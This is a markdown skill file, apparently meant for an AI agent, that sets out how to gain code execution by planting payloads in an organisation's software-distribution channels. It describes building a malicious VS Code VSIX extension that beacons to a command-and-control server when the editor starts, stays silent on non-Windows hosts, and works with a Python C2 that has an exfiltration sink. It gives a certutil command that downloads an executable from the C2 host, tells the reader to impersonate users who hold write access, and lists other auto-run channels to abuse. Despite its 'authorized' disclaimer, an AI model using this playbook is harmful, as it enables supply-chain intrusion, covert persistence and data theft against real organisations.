---
name: code-exec-via-installer-channels
description: Use when a target distributes software packages for exec.
---

# Code Execution via Software-Distribution Channels (reusable)

Authorized-engagement technique: deliver code where a target TRUSTS uploads.

## The pattern
Any org that pulls executables from a share/repo/marketplace on a schedule
executes whatever lands there. Find the drop zone (SMB shares with names like
DevDrop/Software/Deploy; package registries; internal repos), get WRITE via
any account, ship a payload in the native package format.

## VSIX (VS Code extensions) — worked example shape
- Check engine compat in the share's description or target's VS Code version.
- Minimal VSIX = zip with: `extension.vsixmanifest`, `[Content_Types].xml`,
  `extension/package.json` (engines.vscode matching), `extension/extension.js`.
- extension.js runs on editor activate: node `child_process.exec` beaconing
  out. `process.platform === 'win32'` guard keeps it silent on wrong hosts.
- Beacon loop: TCP connect to C2, server sends one-shot cmd, client replies
  `output\n===EOF===\n`. Server: stdlib socketserver ThreadingTCPServer + a
  next_cmd file. ~60 lines total, no deps.

## C2 server gotchas (stdlib Python)
- One-shot-per-connect handlers: log CONNECT + output to a file you can tail.
- HTTP sink on a second port for POST /exfil (JSON tags) — survives where
  raw sockets are filtered.
- Serve binaries over plain HTTP on :8000 for certutil pulls:
  `certutil -urlcache -f http://C2:8000/x.exe C:\Windows\Temp\x.exe`
- EncodedCommand (base64 utf-16le) for PowerShell; plain cmd for simple cmds.

## Op-discipline
- Payload beacons every 20-30s; activation timing varies — start C2 FIRST,
  then deliver, then wait quietly (check log tail, don't spam probes).
- Package lands with the WRITER's identity — restore/impersonate a user with
  write rights to the drop, deliver, revert.
- This is for authorized ranges only; delivery format generalizes: any
  trusted auto-exec channel (GPO logon scripts, scheduled-task shares,
  git hooks on a build server) follows the same shape.
